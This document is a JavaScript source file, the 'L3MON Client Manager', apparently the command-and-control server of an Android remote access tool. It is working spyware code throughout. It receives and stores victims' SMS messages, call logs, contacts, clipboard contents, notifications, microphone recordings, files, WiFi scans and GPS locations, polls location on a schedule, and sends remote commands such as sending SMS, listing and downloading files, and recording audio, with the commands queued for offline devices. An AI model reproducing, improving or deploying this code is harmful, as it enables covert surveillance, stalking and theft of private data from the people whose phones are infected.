/**
 * L3MON Client Manager
 * Handles all client connections and data management
 * Refactored and improved version
 */

const CONST = require('./const');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

class ClientManager {
    constructor(db) {
        this.clientConnections = new Map();
        this.gpsPollers = new Map();
        this.clientDatabases = new Map();
        this.ignoreDisconnects = new Map();
        this.db = db;
    }

    // ==================== CONNECTION MANAGEMENT ====================

    /**
     * Handle client connection
     * @param {Socket} connection - Socket connection
     * @param {string} clientID - Unique client identifier
     * @param {Object} clientData - Client device data
     */
    clientConnect(connection, clientID, clientData) {
        this.clientConnections.set(clientID, connection);

        // Handle reconnection logic
        const shouldIgnore = this.ignoreDisconnects.has(clientID);
        this.ignoreDisconnects.set(clientID, shouldIgnore);

        console.log(`Client ${clientID} connected (ignore disconnect: ${shouldIgnore})`);

        this._updateOrCreateClient(clientID, clientData);
        
        const clientDatabase = this.getClientDatabase(clientID);
        this._setupListeners(clientID, clientDatabase);
    }

    /**
     * Update existing client or create new one
     * @private
     */
    _updateOrCreateClient(clientID, clientData) {
        const client = this.db.maindb.get('clients').find({ clientID });
        const now = new Date();

        if (client.value() === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: now,
                lastSeen: now,
                isOnline: true,
                dynamicData: clientData
            }).write();
        } else {
            client.assign({
                lastSeen: now,
                isOnline: true,
                dynamicData: clientData
            }).write();
        }
    }

    /**
     * Handle client disconnection
     * @param {string} clientID - Client identifier
     */
    clientDisconnect(clientID) {
        const shouldIgnore = this.ignoreDisconnects.get(clientID);
        console.log(`Client ${clientID} disconnected (ignored: ${shouldIgnore})`);

        if (shouldIgnore) {
            this.ignoreDisconnects.delete(clientID);
            return;
        }

        logManager.log(CONST.logTypes.info, `${clientID} Disconnected`);
        
        this.db.maindb.get('clients').find({ clientID }).assign({
            lastSeen: new Date(),
            isOnline: false,
        }).write();

        this.clientConnections.delete(clientID);
        
        if (this.gpsPollers.has(clientID)) {
            clearInterval(this.gpsPollers.get(clientID));
            this.gpsPollers.delete(clientID);
        }
        
        this.ignoreDisconnects.delete(clientID);
    }

    /**
     * Get or create client database
     * @param {string} clientID - Client identifier
     * @returns {Object} Client database instance
     */
    getClientDatabase(clientID) {
        if (this.clientDatabases.has(clientID)) {
            return this.clientDatabases.get(clientID);
        }
        
        const clientDb = new this.db.clientdb(clientID);
        this.clientDatabases.set(clientID, clientDb);
        return clientDb;
    }

    // ==================== SOCKET LISTENERS ====================

    /**
     * Setup socket event listeners
     * @private
     */
    _setupListeners(clientID, client) {
        const socket = this.clientConnections.get(clientID);
        
        if (!socket) {
            console.error(`No socket found for client ${clientID}`);
            return;
        }

        logManager.log(CONST.logTypes.info, `${clientID} Connected`);
        
        // Disconnect handler
        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Process queued commands
        this._processCommandQueue(clientID, client);

        // Start GPS polling if enabled
        this._startGpsPolling(clientID);

        // Setup data handlers
        this._setupFileHandler(socket, clientID, client);
        this._setupCallHandler(socket, clientID, client);
        this._setupSmsHandler(socket, clientID, client);
        this._setupMicHandler(socket, clientID, client);
        this._setupLocationHandler(socket, clientID, client);
        this._setupClipboardHandler(socket, clientID, client);
        this._setupNotificationHandler(socket, clientID, client);
        this._setupContactsHandler(socket, clientID, client);
        this._setupWifiHandler(socket, clientID, client);
        this._setupPermissionsHandler(socket, clientID, client);
        this._setupAppsHandler(socket, clientID, client);
    }

    /**
     * Process queued commands for client
     * @private
     */
    _processCommandQueue(clientID, client) {
        const clientQueue = client.get('CommandQue').value();
        
        if (!clientQueue || clientQueue.length === 0) return;

        logManager.log(CONST.logTypes.info, `${clientID} Running ${clientQueue.length} Queued Commands`);
        
        clientQueue.forEach((command) => {
            const uid = command.uid;
            this.sendCommand(clientID, command.type, command, (error) => {
                if (!error) {
                    client.get('CommandQue').remove({ uid }).write();
                } else {
                    logManager.log(CONST.logTypes.error, `${clientID} Queued Command (${command.type}) Failed`);
                }
            });
        });
    }

    // ==================== DATA HANDLERS ====================

    _setupFileHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.files, (data) => {
            try {
                if (data.type === "list") {
                    this._handleFileList(data, clientID, client);
                } else if (data.type === "download") {
                    this._handleFileDownload(data, clientID, client);
                } else if (data.type === "error") {
                    console.error(`File error from ${clientID}:`, data.error);
                }
            } catch (err) {
                console.error(`Error handling file data from ${clientID}:`, err);
            }
        });
    }

    _handleFileList(data, clientID, client) {
        if (data.list && data.list.length > 0) {
            client.get('currentFolder').remove().write();
            client.get('currentFolder').assign(data.list).write();
            logManager.log(CONST.logTypes.success, `${clientID} File List Updated`);
        }
    }

    _handleFileDownload(data, clientID, client) {
        logManager.log(CONST.logTypes.info, `Receiving File From ${clientID}`);

        const fileKey = this._generateFileKey();
        const fileExt = this._getFileExtension(data.name);
        const filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

        fs.writeFile(filePath, data.buffer, (error) => {
            if (!error) {
                client.get('downloads').push({
                    time: new Date(),
                    type: "download",
                    originalName: data.name,
                    path: `${CONST.downloadsFolder}/${fileKey}${fileExt}`
                }).write();
                logManager.log(CONST.logTypes.success, `File From ${clientID} Saved`);
            } else {
                console.error(`Error saving file from ${clientID}:`, error);
            }
        });
    }

    _setupCallHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.call, (data) => {
            try {
                if (!data.callsList || data.callsList.length === 0) return;

                const dbCall = client.get('CallData');
                let newCount = 0;

                data.callsList.forEach(call => {
                    const hash = this._createHash(call.phoneNo + call.date);
                    if (dbCall.find({ hash }).value() === undefined) {
                        call.hash = hash;
                        dbCall.push(call).write();
                        newCount++;
                    }
                });

                logManager.log(CONST.logTypes.success, `${clientID} Call Log Updated - ${newCount} New Calls`);
            } catch (err) {
                console.error(`Error handling call data from ${clientID}:`, err);
            }
        });
    }

    _setupSmsHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.sms, (data) => {
            try {
                if (typeof data === "object" && data.smslist) {
                    const dbSMS = client.get('SMSData');
                    let newCount = 0;

                    data.smslist.forEach(sms => {
                        const hash = this._createHash(sms.address + sms.body);
                        if (dbSMS.find({ hash }).value() === undefined) {
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                            newCount++;
                        }
                    });

                    logManager.log(CONST.logTypes.success, `${clientID} SMS List Updated - ${newCount} New Messages`);
                } else if (typeof data === "boolean") {
                    logManager.log(CONST.logTypes.success, `${clientID} SENT SMS`);
                }
            } catch (err) {
                console.error(`Error handling SMS data from ${clientID}:`, err);
            }
        });
    }

    _setupMicHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.mic, (data) => {
            try {
                if (!data.file) return;

                logManager.log(CONST.logTypes.info, `Receiving ${data.name} from ${clientID}`);

                const fileKey = this._generateFileKey();
                const fileExt = this._getFileExtension(data.name);
                const filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        client.get('downloads').push({
                            time: new Date(),
                            type: "voiceRecord",
                            originalName: data.name,
                            path: `${CONST.downloadsFolder}/${fileKey}${fileExt}`
                        }).write();
                        logManager.log(CONST.logTypes.success, `Voice recording from ${clientID} saved`);
                    } else {
                        console.error(`Error saving mic file from ${clientID}:`, error);
                    }
                });
            } catch (err) {
                console.error(`Error handling mic data from ${clientID}:`, err);
            }
        });
    }

    _setupLocationHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.location, (data) => {
            try {
                if (data && data.latitude !== undefined && data.longitude !== undefined) {
                    client.get('GPSData').push({
                        time: new Date(),
                        enabled: data.enabled || false,
                        latitude: data.latitude || 0,
                        longitude: data.longitude || 0,
                        altitude: data.altitude || 0,
                        accuracy: data.accuracy || 0,
                        speed: data.speed || 0
                    }).write();
                    logManager.log(CONST.logTypes.success, `${clientID} GPS Updated`);
                } else {
                    logManager.log(CONST.logTypes.error, `${clientID} GPS Received No Data`);
                }
            } catch (err) {
                console.error(`Error handling location data from ${clientID}:`, err);
            }
        });
    }

    _setupClipboardHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.clipboard, (data) => {
            try {
                client.get('clipboardLog').push({
                    time: new Date(),
                    content: data.text
                }).write();
                logManager.log(CONST.logTypes.info, `${clientID} Clipboard Received`);
            } catch (err) {
                console.error(`Error handling clipboard data from ${clientID}:`, err);
            }
        });
    }

    _setupNotificationHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.notification, (data) => {
            try {
                const dbNotificationLog = client.get('notificationLog');
                const hash = this._createHash(data.key + data.content);

                if (dbNotificationLog.find({ hash }).value() === undefined) {
                    data.hash = hash;
                    dbNotificationLog.push(data).write();
                    logManager.log(CONST.logTypes.info, `${clientID} Notification Received`);
                }
            } catch (err) {
                console.error(`Error handling notification data from ${clientID}:`, err);
            }
        });
    }

    _setupContactsHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.contacts, (data) => {
            try {
                if (!data.contactsList || data.contactsList.length === 0) return;

                const dbContacts = client.get('contacts');
                let newCount = 0;

                data.contactsList.forEach(contact => {
                    contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                    const hash = this._createHash(contact.phoneNo + contact.name);
                    
                    if (dbContacts.find({ hash }).value() === undefined) {
                        contact.hash = hash;
                        dbContacts.push(contact).write();
                        newCount++;
                    }
                });

                logManager.log(CONST.logTypes.success, `${clientID} Contacts Updated - ${newCount} New Contacts Added`);
            } catch (err) {
                console.error(`Error handling contacts data from ${clientID}:`, err);
            }
        });
    }

    _setupWifiHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.wifi, (data) => {
            try {
                if (!data.networks || data.networks.length === 0) return;

                const dbwifiLog = client.get('wifiLog');
                client.get('wifiNow').remove().write();
                client.get('wifiNow').assign(data.networks).write();

                let newCount = 0;
                const now = new Date();

                data.networks.forEach(wifi => {
                    const wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                    
                    if (wifiField.value() === undefined) {
                        wifi.firstSeen = now;
                        wifi.lastSeen = now;
                        dbwifiLog.push(wifi).write();
                        newCount++;
                    } else {
                        wifiField.assign({ lastSeen: now }).write();
                    }
                });

                logManager.log(CONST.logTypes.success, `${clientID} WiFi Updated - ${newCount} New Networks Found`);
            } catch (err) {
                console.error(`Error handling WiFi data from ${clientID}:`, err);
            }
        });
    }

    _setupPermissionsHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.permissions, (data) => {
            try {
                client.get('enabledPermissions').assign(data.permissions).write();
                logManager.log(CONST.logTypes.success, `${clientID} Permissions Updated`);
            } catch (err) {
                console.error(`Error handling permissions data from ${clientID}:`, err);
            }
        });
    }

    _setupAppsHandler(socket, clientID, client) {
        socket.on(CONST.messageKeys.installed, (data) => {
            try {
                client.get('apps').assign(data.apps).write();
                logManager.log(CONST.logTypes.success, `${clientID} Apps Updated`);
            } catch (err) {
                console.error(`Error handling apps data from ${clientID}:`, err);
            }
        });
    }

    // ==================== GETTERS ====================

    /**
     * Get client info
     * @param {string} clientID - Client identifier
     * @returns {Object|boolean} Client info or false
     */
    getClient(clientID) {
        const client = this.db.maindb.get('clients').find({ clientID }).value();
        return client || false;
    }

    /**
     * Get all clients
     * @returns {Array} List of all clients
     */
    getClientList() {
        return this.db.maindb.get('clients').value() || [];
    }

    /**
     * Get online clients
     * @returns {Array} List of online clients
     */
    getClientListOnline() {
        return this.getClientList().filter(client => client.isOnline);
    }

    /**
     * Get offline clients
     * @returns {Array} List of offline clients
     */
    getClientListOffline() {
        return this.getClientList().filter(client => !client.isOnline);
    }

    /**
     * Get client data for a specific page
     * @param {string} clientID - Client identifier
     * @param {string} page - Page type
     * @param {string} filter - Optional filter
     * @returns {Object|boolean} Page data or false
     */
    getClientDataByPage(clientID, page, filter = undefined) {
        const client = this.db.maindb.get('clients').find({ clientID }).value();
        
        if (!client) return false;

        const clientDB = this.getClientDatabase(client.clientID);
        const clientData = clientDB.value();

        const pageHandlers = {
            calls: () => this._getCallsData(clientDB, filter),
            sms: () => this._getSmsData(clientDB, clientData, filter),
            notifications: () => this._getNotificationsData(clientDB, filter),
            wifi: () => ({ now: clientData.wifiNow, log: clientData.wifiLog }),
            contacts: () => clientData.contacts,
            permissions: () => clientData.enabledPermissions,
            clipboard: () => clientDB.get('clipboardLog').sortBy('time').reverse().value(),
            apps: () => clientData.apps,
            files: () => clientData.currentFolder,
            downloads: () => clientData.downloads.filter(d => d.type === "download"),
            microphone: () => clientDB.get('downloads').value().filter(d => d.type === "voiceRecord"),
            gps: () => clientData.GPSData,
            info: () => client
        };

        const handler = pageHandlers[page];
        return handler ? handler() : false;
    }

    _getCallsData(clientDB, filter) {
        const calls = clientDB.get('CallData').sortBy('date').reverse().value();
        if (filter) {
            return calls.filter(call => call.phoneNo.substr(-6) === filter.substr(-6));
        }
        return calls;
    }

    _getSmsData(clientDB, clientData, filter) {
        if (filter) {
            return clientDB.get('SMSData').value().filter(sms => 
                sms.address.substr(-6) === filter.substr(-6)
            );
        }
        return clientData.SMSData;
    }

    _getNotificationsData(clientDB, filter) {
        const notifications = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
        if (filter) {
            return notifications.filter(n => n.appName === filter);
        }
        return notifications;
    }

    // ==================== COMMANDS ====================

    /**
     * Send command to client
     * @param {string} clientID - Client identifier
     * @param {string} commandID - Command type
     * @param {Object} commandPayload - Command payload
     * @param {Function} cb - Callback
     */
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => {}) {
        this._validateCommandParams(commandID, commandPayload, (error) => {
            if (error) {
                return cb(error, undefined);
            }

            const client = this.db.maindb.get('clients').find({ clientID }).value();
            
            if (!client) {
                return cb('Client doesn\'t exist!', undefined);
            }

            commandPayload.type = commandID;

            if (this.clientConnections.has(clientID)) {
                const socket = this.clientConnections.get(clientID);
                logManager.log(CONST.logTypes.info, `Requested ${commandID} From ${clientID}`);
                socket.emit('order', commandPayload);
                return cb(false, 'Requested');
            }

            // Queue command for offline client
            this._queueCommand(clientID, commandPayload, (error) => {
                if (!error) {
                    return cb(false, 'Command queued (device is offline)');
                }
                return cb(error, undefined);
            });
        });
    }

    /**
     * Queue command for offline client
     * @private
     */
    _queueCommand(clientID, commandPayload, cb) {
        const clientDB = this.getClientDatabase(clientID);
        const commandQueue = clientDB.get('CommandQue');
        const existingTypes = commandQueue.value().map(cmd => cmd.type);

        if (existingTypes.includes(commandPayload.type)) {
            return cb('A similar command has already been queued');
        }

        commandPayload.uid = Math.floor(Math.random() * 100000);
        commandQueue.push(commandPayload).write();
        return cb(false);
    }

    /**
     * Validate command parameters
     * @private
     */
    _validateCommandParams(commandID, commandPayload, cb) {
        const validators = {
            [CONST.messageKeys.sms]: () => this._validateSmsCommand(commandPayload),
            [CONST.messageKeys.files]: () => this._validateFilesCommand(commandPayload),
            [CONST.messageKeys.mic]: () => {
                if (!('sec' in commandPayload)) return 'Mic Missing `sec` Parameter';
                return false;
            },
            [CONST.messageKeys.gotPermission]: () => {
                if (!('permission' in commandPayload)) return 'GotPerm Missing `permission` Parameter';
                return false;
            }
        };

        const validator = validators[commandID];
        
        if (validator) {
            const error = validator();
            return cb(error);
        }

        // Check if command exists
        if (Object.values(CONST.messageKeys).includes(commandID)) {
            return cb(false);
        }

        return cb('Command ID Not Found');
    }

    _validateSmsCommand(payload) {
        if (!('action' in payload)) return 'SMS Missing `action` Parameter';
        if (payload.action === 'ls') return false;
        if (payload.action === 'sendSMS') {
            if (!('to' in payload)) return 'SMS Missing `to` Parameter';
            if (!('sms' in payload)) return 'SMS Missing `sms` Parameter';
            return false;
        }
        return 'SMS `action` parameter incorrect';
    }

    _validateFilesCommand(payload) {
        if (!('action' in payload)) return 'Files Missing `action` Parameter';
        if (['ls', 'dl'].includes(payload.action)) {
            if (!('path' in payload)) return 'Files Missing `path` Parameter';
            return false;
        }
        return 'Files `action` parameter incorrect';
    }

    // ==================== GPS POLLING ====================

    /**
     * Start GPS polling for client
     * @private
     */
    _startGpsPolling(clientID) {
        this.gpsPoll(clientID);
    }

    /**
     * Setup GPS polling interval
     * @param {string} clientID - Client identifier
     */
    gpsPoll(clientID) {
        // Clear existing poller
        if (this.gpsPollers.has(clientID)) {
            clearInterval(this.gpsPollers.get(clientID));
            this.gpsPollers.delete(clientID);
        }

        const clientDB = this.getClientDatabase(clientID);
        const gpsSettings = clientDB.get('GPSSettings').value();

        if (gpsSettings && gpsSettings.updateFrequency > 0) {
            const interval = setInterval(() => {
                logManager.log(CONST.logTypes.info, `${clientID} POLL COMMAND - GPS`);
                this.sendCommand(clientID, CONST.messageKeys.location);
            }, gpsSettings.updateFrequency * 1000);

            this.gpsPollers.set(clientID, interval);
        }
    }

    /**
     * Set GPS polling speed
     * @param {string} clientID - Client identifier
     * @param {number} pollEvery - Poll interval in seconds
     * @param {Function} cb - Callback
     */
    setGpsPollSpeed(clientID, pollEvery, cb) {
        if (pollEvery < 30 && pollEvery !== 0) {
            return cb('Polling interval must be at least 30 seconds or 0 to disable');
        }

        const clientDB = this.getClientDatabase(clientID);
        clientDB.get('GPSSettings').assign({ updateFrequency: pollEvery }).write();
        this.gpsPoll(clientID);
        cb(false);
    }

    // ==================== DELETE ====================

    /**
     * Delete client
     * @param {string} clientID - Client identifier
     */
    deleteClient(clientID) {
        this.db.maindb.get('clients').remove({ clientID }).write();
        this.clientConnections.delete(clientID);
        
        if (this.gpsPollers.has(clientID)) {
            clearInterval(this.gpsPollers.get(clientID));
            this.gpsPollers.delete(clientID);
        }
        
        this.clientDatabases.delete(clientID);
    }

    // ==================== UTILITIES ====================

    /**
     * Generate unique file key
     * @private
     */
    _generateFileKey() {
        const hash = this._createHash(Date.now() + Math.random().toString());
        return `${hash.substr(0, 5)}-${hash.substr(5, 4)}-${hash.substr(9, 5)}`;
    }

    /**
     * Get file extension
     * @private
     */
    _getFileExtension(filename) {
        const lastDot = filename.lastIndexOf('.');
        if (lastDot === -1 || lastDot === filename.length - 1) {
            return '.unknown';
        }
        return filename.substring(lastDot);
    }

    /**
     * Create MD5 hash
     * @private
     */
    _createHash(data) {
        return crypto.createHash('md5').update(String(data)).digest('hex');
    }

    /**
     * Get connection stats
     * @returns {Object} Connection statistics
     */
    getStats() {
        return {
            totalClients: this.getClientList().length,
            onlineClients: this.getClientListOnline().length,
            offlineClients: this.getClientListOffline().length,
            activePollers: this.gpsPollers.size
        };
    }
}

module.exports = ClientManager;
